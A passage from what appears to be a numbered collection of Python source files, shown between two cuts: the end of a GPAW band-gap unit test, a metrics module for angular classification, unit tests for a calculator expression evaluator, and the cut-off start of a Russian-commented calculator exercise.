GPAW(**calc_.parameters)\n        calc_gllb.set(xc=\"GLLBSC\",\n                      txt=os.path.join(base_dir, \"gllb-gs.txt\"))\n        calc_gllb.atoms = calc_.atoms\n        del calc_\n        calc_gllb.get_potential_energy()  # SC calculation\n        calc_gllb.write(\"gllb-gs.gpw\")\n        calc_gllb_bs = GPAW(restart=\"gllb-gs.gpw\",\n                            kpts=kpts_bs,\n                            fixdensity=True,\n                            symmetry=\"off\",\n                            txt=os.path.join(base_dir,\"gllb-bs.txt\"))\n        world.barrier()\n        calc_gllb_bs.get_potential_energy()\n        homolumo = calc_gllb_bs.get_homo_lumo()\n        bg_gllb_ks = homolumo[1] - homolumo[0]\n        response = calc_gllb.hamiltonian.xc.xcs[\"RESPONSE\"]\n        response.calculate_delta_xc( homolumo / Ha)\n        EKs, Dxc = response.calculate_delta_xc_perturbation()\n        bg_gllb_deltaxc = EKs + Dxc\n\n        ibz_kpts = calc_gllb_bs.get_ibz_k_points()\n        e_kn = numpy.array([calc_gllb_bs.get_eigenvalues(kpt=k) \\\n                            for k in range(len(ibz_kpts))])\n        efermi = calc_gllb_bs.get_fermi_level()\n        e_kn[e_kn > efermi] += Dxc\n        bg_gllb_min, *_ = bandgap(eigenvalues=e_kn,\n                               efermi=efermi,\n                               direct=False)\n        bg_gllb_dir, *_  = bandgap(eigenvalues=e_kn,\n                               efermi=efermi,\n                               direct=True)\n\n        parprint(\"PBE: E_min \\t E_dir\")\n        parprint(\"{:.3f}\\t{:.3f}\".format(bg_pbe_min, bg_pbe_dir))\n        parprint(\"Gllb: EKS \\t E_deltaxc\")\n        parprint(\"{:.3f}\\t{:.3f}\".format(bg_gllb_ks, bg_gllb_deltaxc))\n        parprint(\"Gllb: E_min \\t E_dir\")\n        parprint(\"{:.3f}\\t{:.3f}\".format(bg_gllb_min, bg_gllb_dir))\n        bs_gllb = calc_gllb_bs.band_structure()\n        bs_gllb.energies[bs_gllb.energies > bs_gllb.reference] += Dxc\n        bs_gllb.plot(emin=-10, emax=10,\n                    filename=os.path.join(base_dir, \"gllb-bs.png\"))\n            \n        calc_gllb_bs.write(os.path.join(base_dir,\n                                        \"gllb-bs.gpw\"))\n        \"\"\"\n\n    \n        \nif __name__ == \"__main__\":\n    unittest.main()\n", "557": "import numpy as np\nimport os\n\nfrom scipy import stats\n\nfrom sklearn.metrics import roc_auc_score\n\nfrom src_py.metrics_utils import calculate_deltas_unsigned, calculate_deltas_signed\n\n\ndef weight_fun(x, a, b, c):\n    return a + b * np.cos(x) + c * np.sin(x)\n\ndef calc_weights(num_classes, coeffs):\n    k2PI = 2* np.pi\n    x = np.linspace(0, k2PI, num_classes)\n    data_len = coeffs.shape[0]\n    weights = np.zeros((data_len, num_classes))\n    for i in range(data_len):\n        weights[i] = weight_fun(x, *coeffs[i])\n    return weights\n\ndef calc_argmaxs_distances(pred_arg_maxs, calc_arg_maxs, num_class):\n    return calculate_deltas_signed(calc_arg_maxs, pred_arg_maxs, num_class)\n\n\ndef calculate_metrics_from_file(directory, num_classes):\n    calc_w = np.load(os.path.join(directory, 'softmax_calc_w.npy'))\n    preds_w = np.load(os.path.join(directory, 'softmax_preds_w.npy'))\n    return calculate_metrics(calc_w, preds_w, num_classes)\n\n\ndef calculate_metrics(calc_w, preds_w, num_classes):\n    pred_arg_maxs = np.argmax(preds_w, axis=1)\n    calc_arg_maxs = np.argmax(calc_w, axis=1)\n\n    k2PI = 2 * np.pi\n    calc_pred_argmaxs_abs_distances = calculate_deltas_unsigned( pred_arg_maxs, calc_arg_maxs, num_classes)\n    calc_pred_argmaxs_signed_distances = calculate_deltas_signed(pred_arg_maxs, calc_arg_maxs, num_classes)\n    calc_pred_argmaxs_abs_distances_rad = calc_pred_argmaxs_abs_distances * k2PI/(1.0*num_classes)\n    \n    mean_deltas = np.mean(calc_pred_argmaxs_signed_distances, dtype=np.float64)\n    mean_deltas_err = stats.sem(calc_pred_argmaxs_signed_distances)\n    mean_deltas_rad = mean_deltas * k2PI/(1.0*num_classes)\n    mean_deltas_err_rad = mean_deltas_err * k2PI/(1.0*num_classes)\n\n    acc0 = (calc_pred_argmaxs_abs_distances <= 0).mean()\n    acc1 = (calc_pred_argmaxs_abs_distances <= 1).mean()\n    acc2 = (calc_pred_argmaxs_abs_distances <= 2).mean()\n    acc3 = (calc_pred_argmaxs_abs_distances <= 3).mean()\n\n    acc0_rad = (calc_pred_argmaxs_abs_distances_rad <= 0.25).mean()\n    acc1_rad = (calc_pred_argmaxs_abs_distances_rad <= 0.50).mean()\n    acc2_rad = (calc_pred_argmaxs_abs_distances_rad <= 0.75).mean()\n    acc3_rad = (calc_pred_argmaxs_abs_distances_rad <= 1.00).mean()\n\n    l1_delta_w = np.mean(np.abs(calc_w - preds_w), dtype=np.float64)\n    l2_delta_w = np.sqrt(np.mean((calc_w - preds_w)**2), dtype=np.float64)\n    # problem with format, should not be array\n    l2_delta_w_err = stats.sem((calc_w - preds_w)**2)\n\n    # calc_w, preds_w normalisation to probability\n    calc_w_norm = calc_w / np.sum(calc_w, axis=1)[:, np.newaxis]\n    preds_w_norm = preds_w / np.sum(preds_w, axis=1)[:, np.newaxis]\n \n    l1_delta_w_norm = np.mean(np.abs(calc_w_norm - preds_w_norm), dtype=np.float64)\n    l2_delta_w_norm = np.sqrt(np.mean((calc_w_norm - preds_w_norm)**2), dtype=np.float64)\n    # problem with format, should not be array\n    l2_delta_w_norm_err = stats.sem((calc_w_norm - preds_w_norm)**2)\n  \n    \n    return np.array([acc0, acc1, acc2, acc3, mean_deltas, l1_delta_w, l2_delta_w, mean_deltas_rad, acc0_rad, acc1_rad, acc2_rad, acc3_rad,l1_delta_w_norm, l2_delta_w_norm, mean_deltas_err, mean_deltas_err_rad, l2_delta_w_err, l2_delta_w_norm_err ]) \n\n\ndef calculate_metrics_regr_c012s_from_file(directory, num_classes):\n    calc_c012s = np.load(os.path.join(directory,'test_regr_calc_c012s.npy'))\n    pred_c012s = np.load(os.path.join(directory,'test_regr_preds_c012s.npy'))\n\n    return calculate_metrics_regr_c012s(calc_c012s, pred_c012s, num_classes)\n\n\ndef calculate_metrics_regr_c012s(calc_c012s, pred_c012s, num_classes):\n    calc_w  = calc_weights(num_classes, calc_c012s)\n    preds_w = calc_weights(num_classes, pred_c012s)\n\n    return calculate_metrics(calc_w, preds_w, num_classes)\n\n\ndef get_filename_for_class(pathIN, class_num, subset=None):\n    d = '../monit_npy/nn_rhorho_Variant-All_Unweighted_False_NO_NUM_CLASSES_{class_num}'\n    if subset:\n        d += \"_WEIGHTS_SUBS\" + str(subset)\n    return d\n\n\n# The primary versions of three methods below were\n#  evaluate from tf_model.py\n#  evaluate2 from tf_model.py\n#  both using \n#  evaluate_preds  from tf_model.py\n# when extending to multi-class something is not correctly\n# implemented for handling numpy arrays. \n\n\ndef evaluate_roc_auc(preds, wa, wb):\n    n = len(preds)\n    true_labels = np.concatenate([np.ones(n), np.zeros(n)])\n    preds = np.concatenate([preds, preds])\n    weights = np.concatenate([wa, wb])\n    \n    return roc_auc_score(true_labels, preds, sample_weight=weights)\n\n\ndef calculate_roc_auc(preds_w, calc_w, index_a, index_b):\n    n, num_classes = calc_w.shape\n    true_labels = np.concatenate([np.ones(n), np.zeros(n)])\n    preds = np.concatenate([preds_w[:, index_a], preds_w[:, index_a]])\n    weights = np.concatenate([calc_w[:, index_a], calc_w[:, index_b]])\n\n    return roc_auc_score(true_labels, preds, sample_weight=weights)\n\n# binary classification\ndef test_roc_auc(directory, num_class):\n    calc_w = np.load(os.path.join(directory, 'softmax_calc_w.npy'))\n    preds_w = np.load(os.path.join(directory, 'softmax_preds_w.npy'))\n    \n    oracle_roc_auc = []\n    preds_roc_auc  = []\n    \n    for i in range(0, num_class):\n         oracle_roc_auc  += [calculate_roc_auc(calc_w, calc_w, 0, i)]\n         preds_roc_auc   += [calculate_roc_auc(preds_w, calc_w, 0, i)]\n         print(i,\n                  'oracle_roc_auc: {}'.format(calculate_roc_auc(calc_w, calc_w, 0, i)),\n                  'preds_roc_auc: {}'.format(calculate_roc_auc(preds_w, calc_w, 0, i)))\n\n    return oracle_roc_auc, preds_roc_auc\n", "558": "\"\"\"\nUnit tests for calc.py\n\"\"\"\n\nimport unittest\nimport numpy\nimport calc\nfrom pyparsing import ParseException\n\n# numpy's default behavior when it evaluates a function outside its domain\n# is to raise a warning (not an exception) which is then printed to STDOUT.\n# To prevent this from polluting the output of the tests, configure numpy to\n# ignore it instead.\n# See http://docs.scipy.org/doc/numpy/reference/generated/numpy.seterr.html\nnumpy.seterr(all='ignore')  # Also: 'ignore', 'warn' (default), 'raise'\n\n\nclass EvaluatorTest(unittest.TestCase):\n    \"\"\"\n    Run tests for calc.evaluator\n    Go through all functionalities as specifically as possible--\n    work from number input to functions and complex expressions\n    Also test custom variable substitutions (i.e.\n      `evaluator({'x':3.0}, {}, '3*x')`\n    gives 9.0) and more.\n    \"\"\"\n\n    def test_number_input(self):\n        \"\"\"\n        Test different kinds of float inputs\n\n        See also\n          test_trailing_period (slightly different)\n          test_exponential_answer\n          test_si_suffix\n        \"\"\"\n        easy_eval = lambda x: calc.evaluator({}, {}, x)\n\n        self.assertEqual(easy_eval(\"13\"), 13)\n        self.assertEqual(easy_eval(\"3.14\"), 3.14)\n        self.assertEqual(easy_eval(\".618033989\"), 0.618033989)\n\n        self.assertEqual(easy_eval(\"-13\"), -13)\n        self.assertEqual(easy_eval(\"-3.14\"), -3.14)\n        self.assertEqual(easy_eval(\"-.618033989\"), -0.618033989)\n\n    def test_period(self):\n        \"\"\"\n        The string '.' should not evaluate to anything.\n        \"\"\"\n        with self.assertRaises(ParseException):\n            calc.evaluator({}, {}, '.')\n        with self.assertRaises(ParseException):\n            calc.evaluator({}, {}, '1+.')\n\n    def test_trailing_period(self):\n        \"\"\"\n        Test that things like '4.' will be 4 and not throw an error\n        \"\"\"\n        self.assertEqual(4.0, calc.evaluator({}, {}, '4.'))\n\n    def test_exponential_answer(self):\n        \"\"\"\n        Test for correct interpretation of scientific notation\n        \"\"\"\n        answer = 50\n        correct_responses = [\n            \"50\", \"50.0\", \"5e1\", \"5e+1\",\n            \"50e0\", \"50.0e0\", \"500e-1\"\n        ]\n        incorrect_responses = [\"\", \"3.9\", \"4.1\", \"0\", \"5.01e1\"]\n\n        for input_str in correct_responses:\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Expected '{0}' to equal {1}\".format(\n                input_str, answer\n            )\n            self.assertEqual(answer, result, msg=fail_msg)\n\n        for input_str in incorrect_responses:\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Expected '{0}' to not equal {1}\".format(\n                input_str, answer\n            )\n            self.assertNotEqual(answer, result, msg=fail_msg)\n\n    def test_si_suffix(self):\n        \"\"\"\n        Test calc.py's unique functionality of interpreting si 'suffixes'.\n\n        For instance 'k' stand for 'kilo-' so '1k' should be 1,000\n        \"\"\"\n        test_mapping = [\n            ('4.2%', 0.042), ('2.25k', 2250), ('8.3M', 8300000),\n            ('9.9G', 9.9e9), ('1.2T', 1.2e12), ('7.4c', 0.074),\n            ('5.4m', 0.0054), ('8.7u', 0.0000087),\n            ('5.6n', 5.6e-9), ('4.2p', 4.2e-12)\n        ]\n\n        for (expr, answer) in test_mapping:\n            tolerance = answer * 1e-6  # Make rel. tolerance, because of floats\n            fail_msg = \"Failure in testing suffix '{0}': '{1}' was not {2}\"\n            fail_msg = fail_msg.format(expr[-1], expr, answer)\n            self.assertAlmostEqual(\n                calc.evaluator({}, {}, expr), answer,\n                delta=tolerance, msg=fail_msg\n            )\n\n    def test_operator_sanity(self):\n        \"\"\"\n        Test for simple things like '5+2' and '5/2'\n        \"\"\"\n        var1 = 5.0\n        var2 = 2.0\n        operators = [('+', 7), ('-', 3), ('*', 10), ('/', 2.5), ('^', 25)]\n\n        for (operator, answer) in operators:\n            input_str = \"{0} {1} {2}\".format(var1, operator, var2)\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Failed on operator '{0}': '{1}' was not {2}\".format(\n                operator, input_str, answer\n            )\n            self.assertEqual(answer, result, msg=fail_msg)\n\n    def test_raises_zero_division_err(self):\n        \"\"\"\n        Ensure division by zero gives an error\n        \"\"\"\n        with self.assertRaises(ZeroDivisionError):\n            calc.evaluator({}, {}, '1/0')\n        with self.assertRaises(ZeroDivisionError):\n            calc.evaluator({}, {}, '1/0.0')\n        with self.assertRaises(ZeroDivisionError):\n            calc.evaluator({'x': 0.0}, {}, '1/x')\n\n    def test_parallel_resistors(self):\n        \"\"\"\n        Test the parallel resistor operator ||\n\n        The formula is given by\n            a || b || c ...\n            = 1 / (1/a + 1/b + 1/c + ...)\n        It is the resistance of a parallel circuit of resistors with resistance\n        a, b, c, etc&. See if this evaulates correctly.\n        \"\"\"\n        self.assertEqual(calc.evaluator({}, {}, '1||1'), 0.5)\n        self.assertEqual(calc.evaluator({}, {}, '1||1||2'), 0.4)\n        self.assertEqual(calc.evaluator({}, {}, \"j||1\"), 0.5 + 0.5j)\n\n    def test_parallel_resistors_with_zero(self):\n        \"\"\"\n        Check the behavior of the || operator with 0\n        \"\"\"\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, '0||1')))\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, '0.0||1')))\n        self.assertTrue(numpy.isnan(calc.evaluator({'x': 0.0}, {}, 'x||1')))\n\n    def assert_function_values(self, fname, ins, outs, tolerance=1e-3):\n        \"\"\"\n        Helper function to test many values at once\n\n        Test the accuracy of evaluator's use of the function given by fname\n        Specifically, the equality of `fname(ins[i])` against outs[i].\n        This is used later to test a whole bunch of f(x) = y at a time\n        \"\"\"\n\n        for (arg, val) in zip(ins, outs):\n            input_str = \"{0}({1})\".format(fname, arg)\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Failed on function {0}: '{1}' was not {2}\".format(\n                fname, input_str, val\n            )\n            self.assertAlmostEqual(val, result, delta=tolerance, msg=fail_msg)\n\n    def test_trig_functions(self):\n        \"\"\"\n        Test the trig functions provided in calc.py\n\n        which are: sin, cos, tan, arccos, arcsin, arctan\n        \"\"\"\n\n        angles = ['-pi/4', '0', 'pi/6', 'pi/5', '5*pi/4', '9*pi/4', '1 + j']\n        sin_values = [-0.707, 0, 0.5, 0.588, -0.707, 0.707, 1.298 + 0.635j]\n        cos_values = [0.707, 1, 0.866, 0.809, -0.707, 0.707, 0.834 - 0.989j]\n        tan_values = [-1, 0, 0.577, 0.727, 1, 1, 0.272 + 1.084j]\n        # Cannot test tan(pi/2) b/c pi/2 is a float and not precise...\n\n        self.assert_function_values('sin', angles, sin_values)\n        self.assert_function_values('cos', angles, cos_values)\n        self.assert_function_values('tan', angles, tan_values)\n\n        # Include those where the real part is between -pi/2 and pi/2\n        arcsin_inputs = ['-0.707', '0', '0.5', '0.588', '1.298 + 0.635*j']\n        arcsin_angles = [-0.785, 0, 0.524, 0.629, 1 + 1j]\n        self.assert_function_values('arcsin', arcsin_inputs, arcsin_angles)\n        # Rather than a complex number, numpy.arcsin gives nan\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, 'arcsin(-1.1)')))\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, 'arcsin(1.1)')))\n\n        # Include those where the real part is between 0 and pi\n        arccos_inputs = ['1', '0.866', '0.809', '0.834-0.989*j']\n        arccos_angles = [0, 0.524, 0.628, 1 + 1j]\n        self.assert_function_values('arccos', arccos_inputs, arccos_angles)\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, 'arccos(-1.1)')))\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, 'arccos(1.1)')))\n\n        # Has the same range as arcsin\n        arctan_inputs = ['-1', '0', '0.577', '0.727', '0.272 + 1.084*j']\n        arctan_angles = arcsin_angles\n        self.assert_function_values('arctan', arctan_inputs, arctan_angles)\n\n    def test_reciprocal_trig_functions(self):\n        \"\"\"\n        Test the reciprocal trig functions provided in calc.py\n\n        which are: sec, csc, cot, arcsec, arccsc, arccot\n        \"\"\"\n        angles = ['-pi/4', 'pi/6', 'pi/5', '5*pi/4', '9*pi/4', '1 + j']\n        sec_values = [1.414, 1.155, 1.236, -1.414, 1.414, 0.498 + 0.591j]\n        csc_values = [-1.414, 2, 1.701, -1.414, 1.414, 0.622 - 0.304j]\n        cot_values = [-1, 1.732, 1.376, 1, 1, 0.218 - 0.868j]\n\n        self.assert_function_values('sec', angles, sec_values)\n        self.assert_function_values('csc', angles, csc_values)\n        self.assert_function_values('cot', angles, cot_values)\n\n        arcsec_inputs = ['1.1547', '1.2361', '2', '-2', '-1.4142', '0.4983+0.5911*j']\n        arcsec_angles = [0.524, 0.628, 1.047, 2.094, 2.356, 1 + 1j]\n        self.assert_function_values('arcsec', arcsec_inputs, arcsec_angles)\n\n        arccsc_inputs = ['-1.1547', '-1.4142', '2', '1.7013', '1.1547', '0.6215-0.3039*j']\n        arccsc_angles = [-1.047, -0.785, 0.524, 0.628, 1.047, 1 + 1j]\n        self.assert_function_values('arccsc', arccsc_inputs, arccsc_angles)\n\n        # Has the same range as arccsc\n        arccot_inputs = ['-0.5774', '-1', '1.7321', '1.3764', '0.5774', '(0.2176-0.868*j)']\n        arccot_angles = arccsc_angles\n        self.assert_function_values('arccot', arccot_inputs, arccot_angles)\n\n    def test_hyperbolic_functions(self):\n        \"\"\"\n        Test the hyperbolic functions\n\n        which are: sinh, cosh, tanh, sech, csch, coth\n        \"\"\"\n        inputs = ['0', '0.5', '1', '2', '1+j']\n        neg_inputs = ['0', '-0.5', '-1', '-2', '-1-j']\n        negate = lambda x: [-k for k in x]\n\n        # sinh is odd\n        sinh_vals = [0, 0.521, 1.175, 3.627, 0.635 + 1.298j]\n        self.assert_function_values('sinh', inputs, sinh_vals)\n        self.assert_function_values('sinh', neg_inputs, negate(sinh_vals))\n\n        # cosh is even - do not negate\n        cosh_vals = [1, 1.128, 1.543, 3.762, 0.834 + 0.989j]\n        self.assert_function_values('cosh', inputs, cosh_vals)\n        self.assert_function_values('cosh', neg_inputs, cosh_vals)\n\n        # tanh is odd\n        tanh_vals = [0, 0.462, 0.762, 0.964, 1.084 + 0.272j]\n        self.assert_function_values('tanh', inputs, tanh_vals)\n        self.assert_function_values('tanh', neg_inputs, negate(tanh_vals))\n\n        # sech is even - do not negate\n        sech_vals = [1, 0.887, 0.648, 0.266, 0.498 - 0.591j]\n        self.assert_function_values('sech', inputs, sech_vals)\n        self.assert_function_values('sech', neg_inputs, sech_vals)\n\n        # the following functions do not have 0 in their domain\n        inputs = inputs[1:]\n        neg_inputs = neg_inputs[1:]\n\n        # csch is odd\n        csch_vals = [1.919, 0.851, 0.276, 0.304 - 0.622j]\n        self.assert_function_values('csch', inputs, csch_vals)\n        self.assert_function_values('csch', neg_inputs, negate(csch_vals))\n\n        # coth is odd\n        coth_vals = [2.164, 1.313, 1.037, 0.868 - 0.218j]\n        self.assert_function_values('coth', inputs, coth_vals)\n        self.assert_function_values('coth', neg_inputs, negate(coth_vals))\n\n    def test_hyperbolic_inverses(self):\n        \"\"\"\n        Test the inverse hyperbolic functions\n\n        which are of the form arc[X]h\n        \"\"\"\n        results = [0, 0.5, 1, 2, 1 + 1j]\n\n        sinh_vals = ['0', '0.5211', '1.1752', '3.6269', '0.635+1.2985*j']\n        self.assert_function_values('arcsinh', sinh_vals, results)\n\n        cosh_vals = ['1', '1.1276', '1.5431', '3.7622', '0.8337+0.9889*j']\n        self.assert_function_values('arccosh', cosh_vals, results)\n\n        tanh_vals = ['0', '0.4621', '0.7616', '0.964', '1.0839+0.2718*j']\n        self.assert_function_values('arctanh', tanh_vals, results)\n\n        sech_vals = ['1.0', '0.8868', '0.6481', '0.2658', '0.4983-0.5911*j']\n        self.assert_function_values('arcsech', sech_vals, results)\n\n        results = results[1:]\n        csch_vals = ['1.919', '0.8509', '0.2757', '0.3039-0.6215*j']\n        self.assert_function_values('arccsch', csch_vals, results)\n\n        coth_vals = ['2.164', '1.313', '1.0373', '0.868-0.2176*j']\n        self.assert_function_values('arccoth', coth_vals, results)\n\n    def test_other_functions(self):\n        \"\"\"\n        Test the non-trig functions provided in calc.py\n\n        Specifically:\n          sqrt, log10, log2, ln, abs,\n          fact, factorial\n        \"\"\"\n\n        # Test sqrt\n        self.assert_function_values(\n            'sqrt',\n            [0, 1, 2, 1024],  # -1\n            [0, 1, 1.414, 32]  # 1j\n        )\n        # sqrt(-1) is NAN not j (!!).\n\n        # Test logs\n        self.assert_function_values(\n            'log10',\n            [0.1, 1, 3.162, 1000000, '1+j'],\n            [-1, 0, 0.5, 6, 0.151 + 0.341j]\n        )\n        self.assert_function_values(\n            'log2',\n            [0.5, 1, 1.414, 1024, '1+j'],\n            [-1, 0, 0.5, 10, 0.5 + 1.133j]\n        )\n        self.assert_function_values(\n            'ln',\n            [0.368, 1, 1.649, 2.718, 42, '1+j'],\n            [-1, 0, 0.5, 1, 3.738, 0.347 + 0.785j]\n        )\n\n        # Test abs\n        self.assert_function_values('abs', [-1, 0, 1, 'j'], [1, 0, 1, 1])\n\n        # Test factorial\n        fact_inputs = [0, 1, 3, 7]\n        fact_values = [1, 1, 6, 5040]\n        self.assert_function_values('fact', fact_inputs, fact_values)\n        self.assert_function_values('factorial', fact_inputs, fact_values)\n\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"fact(-1)\")\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"fact(0.5)\")\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"factorial(-1)\")\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"factorial(0.5)\")\n\n    def test_constants(self):\n        \"\"\"\n        Test the default constants provided in calc.py\n\n        which are: j (complex number), e, pi, k, c, T, q\n        \"\"\"\n\n        # Of the form ('expr', python value, tolerance (or None for exact))\n        default_variables = [\n            ('i', 1j, None),\n            ('j', 1j, None),\n            ('e', 2.7183, 1e-4),\n            ('pi', 3.1416, 1e-4),\n            ('k', 1.3806488e-23, 1e-26),  # Boltzmann constant (Joules/Kelvin)\n            ('c', 2.998e8, 1e5),  # Light Speed in (m/s)\n            ('T', 298.15, 0.01),  # Typical room temperature (Kelvin)\n            ('q', 1.602176565e-19, 1e-22)  # Fund. Charge (Coulombs)\n        ]\n        for (variable, value, tolerance) in default_variables:\n            fail_msg = \"Failed on constant '{0}', not within bounds\".format(\n                variable\n            )\n            result = calc.evaluator({}, {}, variable)\n            if tolerance is None:\n                self.assertEqual(value, result, msg=fail_msg)\n            else:\n                self.assertAlmostEqual(\n                    value, result,\n                    delta=tolerance, msg=fail_msg\n                )\n\n    def test_complex_expression(self):\n        \"\"\"\n        Calculate combinations of operators and default functions\n        \"\"\"\n\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"(2^2+1.0)/sqrt(5e0)*5-1\"),\n            10.180,\n            delta=1e-3\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"1+1/(1+1/(1+1/(1+1)))\"),\n            1.6,\n            delta=1e-3\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"10||sin(7+5)\"),\n            -0.567, delta=0.01\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"sin(e)\"),\n            0.41, delta=0.01\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"k*T/q\"),\n            0.025, delta=1e-3\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"e^(j*pi)\"),\n            -1, delta=1e-5\n        )\n\n    def test_explicit_sci_notation(self):\n        \"\"\"\n        Expressions like 1.6*10^-3 (not 1.6e-3) it should evaluate.\n        \"\"\"\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^-3\"),\n            -0.0016\n        )\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^(-3)\"),\n            -0.0016\n        )\n\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^3\"),\n            -1600\n        )\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^(3)\"),\n            -1600\n        )\n\n    def test_simple_vars(self):\n        \"\"\"\n        Substitution of variables into simple equations\n        \"\"\"\n        variables = {'x': 9.72, 'y': 7.91, 'loooooong': 6.4}\n\n        # Should not change value of constant\n        # even with different numbers of variables...\n        self.assertEqual(calc.evaluator({'x': 9.72}, {}, '13'), 13)\n        self.assertEqual(calc.evaluator({'x': 9.72, 'y': 7.91}, {}, '13'), 13)\n        self.assertEqual(calc.evaluator(variables, {}, '13'), 13)\n\n        # Easy evaluation\n        self.assertEqual(calc.evaluator(variables, {}, 'x'), 9.72)\n        self.assertEqual(calc.evaluator(variables, {}, 'y'), 7.91)\n        self.assertEqual(calc.evaluator(variables, {}, 'loooooong'), 6.4)\n\n        # Test a simple equation\n        self.assertAlmostEqual(\n            calc.evaluator(variables, {}, '3*x-y'),\n            21.25, delta=0.01  # = 3 * 9.72 - 7.91\n        )\n        self.assertAlmostEqual(\n            calc.evaluator(variables, {}, 'x*y'),\n            76.89, delta=0.01\n        )\n\n        self.assertEqual(calc.evaluator({'x': 9.72, 'y': 7.91}, {}, \"13\"), 13)\n        self.assertEqual(calc.evaluator(variables, {}, \"13\"), 13)\n        self.assertEqual(\n            calc.evaluator(\n                {'a': 2.2997471478310274, 'k': 9, 'm': 8, 'x': 0.6600949841121},\n                {}, \"5\"\n            ),\n            5\n        )\n\n    def test_variable_case_sensitivity(self):\n        \"\"\"\n        Test the case sensitivity flag and corresponding behavior\n        \"\"\"\n        self.assertEqual(\n            calc.evaluator({'R1': 2.0, 'R3': 4.0}, {}, \"r1*r3\"),\n            8.0\n        )\n\n        variables = {'t': 1.0}\n        self.assertEqual(calc.evaluator(variables, {}, \"t\"), 1.0)\n        self.assertEqual(calc.evaluator(variables, {}, \"T\"), 1.0)\n        self.assertEqual(\n            calc.evaluator(variables, {}, \"t\", case_sensitive=True),\n            1.0\n        )\n        # Recall 'T' is a default constant, with value 298.15\n        self.assertAlmostEqual(\n            calc.evaluator(variables, {}, \"T\", case_sensitive=True),\n            298, delta=0.2\n        )\n\n    def test_simple_funcs(self):\n        \"\"\"\n        Subsitution of custom functions\n        \"\"\"\n        variables = {'x': 4.712}\n        functions = {'id': lambda x: x}\n        self.assertEqual(calc.evaluator({}, functions, 'id(2.81)'), 2.81)\n        self.assertEqual(calc.evaluator({}, functions, 'id(2.81)'), 2.81)\n        self.assertEqual(calc.evaluator(variables, functions, 'id(x)'), 4.712)\n\n        functions.update({'f': numpy.sin})\n        self.assertAlmostEqual(\n            calc.evaluator(variables, functions, 'f(x)'),\n            -1, delta=1e-3\n        )\n\n    def test_function_case_insensitive(self):\n        \"\"\"\n        Test case insensitive evaluation\n\n        Normal functions with some capitals should be fine\n        \"\"\"\n        self.assertAlmostEqual(\n            -0.28,\n            calc.evaluator({}, {}, 'SiN(6)', case_sensitive=False),\n            delta=1e-3\n        )\n\n    def test_function_case_sensitive(self):\n        \"\"\"\n        Test case sensitive evaluation\n\n        Incorrectly capitilized should fail\n        Also, it should pick the correct version of a function.\n        \"\"\"\n        with self.assertRaisesRegexp(calc.UndefinedVariable, 'SiN'):\n            calc.evaluator({}, {}, 'SiN(6)', case_sensitive=True)\n\n        # With case sensitive turned on, it should pick the right function\n        functions = {'f': lambda x: x, 'F': lambda x: x + 1}\n        self.assertEqual(\n            6, calc.evaluator({}, functions, 'f(6)', case_sensitive=True)\n        )\n        self.assertEqual(\n            7, calc.evaluator({}, functions, 'F(6)', case_sensitive=True)\n        )\n\n    def test_undefined_vars(self):\n        \"\"\"\n        Check to see if the evaluator catches undefined variables\n        \"\"\"\n        variables = {'R1': 2.0, 'R3': 4.0}\n\n        with self.assertRaisesRegexp(calc.UndefinedVariable, 'QWSEKO'):\n            calc.evaluator({}, {}, \"5+7*QWSEKO\")\n        with self.assertRaisesRegexp(calc.UndefinedVariable, 'r2'):\n            calc.evaluator({'r1': 5}, {}, \"r1+r2\")\n        with self.assertRaisesRegexp(calc.UndefinedVariable, 'r1 r3'):\n            calc.evaluator(variables, {}, \"r1*r3\", case_sensitive=True)\n", "559": "# 1. \u041d\u0430\u043f\u0438\u0441\u0430\u0442\u044c \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0443, \u043a\u043e\u0442\u043e\u0440\u0430\u044f \u0431\u0443\u0434\u0435\u0442 \u0441\u043a\u043b\u0430\u0434\u044b\u0432\u0430\u0442\u044c, \u0432\u044b\u0447\u0438\u0442\u0430\u0442\u044c, \u0443\u043c\u043d\u043e\u0436\u0430\u0442\u044c \u0438\u043b\u0438 \u0434\u0435\u043b\u0438\u0442\u044c \u0434\u0432\u0430 \u0447\u0438\u0441\u043b\u0430.\n# \u0427\u0438\u0441\u043b\u0430 \u0438 \u0437\u043d\u0430\u043a \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0438 \u0432\u0432\u043e\u0434\u044f\u0442\u0441\u044f \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u0435\u043c. \u041f\u043e\u0441\u043b\u0435 \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u044f \u0432\u044b\u0447\u0438\u0441\u043b\u0435\u043d\u0438\u044f \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0430 \u0434\u043e\u043b\u0436\u043d\u0430 \u043d\u0435 \u0437\u0430\u0432\u0435\u0440\u0448\u0430\u0442\u044c\u0441\u044f,\n# \u0430 \u0437\u0430\u043f\u0440\u0430\u0448\u0438\u0432\u0430\u0442\u044c \u043d\u043e\u0432\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435 \u0434\u043b\u044f 